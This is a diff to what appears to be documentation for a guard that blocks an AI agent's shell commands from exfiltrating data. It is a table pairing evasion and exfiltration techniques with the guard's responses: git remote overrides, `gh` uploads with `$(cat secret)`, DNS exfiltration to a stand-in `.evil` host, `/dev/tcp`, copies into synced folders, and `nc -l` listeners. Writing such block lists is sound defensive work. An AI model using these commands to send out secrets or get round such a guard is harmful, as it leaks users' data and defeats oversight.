@@ -96,14 +96,15 @@ keep working when any of those rules is changed.
 | `curl -x proxy`, `--resolve`, `-K config` | block |
 | `git remote set-url` then `git push origin` | set-url blocked; push checks the pinned `host/owner/repo` |
 | Editing `.git/config` with the Write tool, then pushing | push still checks the pin → block |
-| `git -c remote.origin.url=… push`, `git -C /other push`, `--git-dir`/`--work-tree`, `--receive-pack=` | block |
-| `git -C <dir>` inside this project's work tree | followed like a `cd`; a push from there still faces the pin check. More than one `-C` blocks |
+| `git -c remote.origin.url=… push`, `git --config-env=remote.origin.url=… push`, `git -C /other push`, `--git-dir`/`--work-tree`, `--receive-pack=` | block |
+| `git -C <dir>` inside this project's work tree | followed like a `cd`; a push from there still faces the pin check. More than one `-C` blocks, as does a `-C` the shell expands (`$DIR`, `~/x`) and a `-C` that selects a separate repository nested inside the work tree |
 | `cd /other/clone && git push origin` | effective directory tracked; pin check applies there |
 | `gh api -f`, `gh gist`, `gh release upload`, `gh pr create --body-file` | block |
 | `gh pr create --body "$(cat secret)"` | substitution on a `gh` line → block |
 | DNS exfiltration (`dig data.evil`, `$(cat s).evil`) | probe tools need a lab host; substitution blocks |
 | `/dev/tcp` bash redirections | regex on the raw text |
-| `cp`/`mv`/`rsync`/`tee`/`dd`/`tar`/`zip`/`ln`/`install`/`ditto` writing into iCloud/Dropbox/OneDrive/`/Volumes` | block — the destination operand (`-t`, `of=`, `tar -C` when extracting, `tar -f` when creating, the zip archive) is what is checked |
+| `cp`/`mv`/`rsync`/`tee`/`dd`/`tar`/`zip`/`ln`/`install`/`ditto` writing into iCloud/Dropbox/OneDrive/`/Volumes` | block — the destination operand (`-t`, `of=`, `tar -C` when extracting, `tar -f` when creating, the zip archive) is what is checked; so are `zip -b`/`--temp-path` (the temporary archive's directory) |
+| A copy destination the shell computes (`cp f "$DEST"`, `mv f "$(…)"`) | block — a computed path cannot be checked; a computed source is allowed |
 | Reading from such a folder (`cp /Volumes/USB/f .`, `cat`, `dd if=`, `tar -cf out.tar /Volumes/…`) | allowed; only a write into one is an upload |
 | A copy tool option the guard does not recognize, or `unzip`/`gzip`/`bzip2`/`xz` | destination cannot be identified → any synced/volume path among the arguments blocks |
 | `python -m http.server`, `nc -l`, `socat …-LISTEN`, `php -S` | serving is exposing → block |
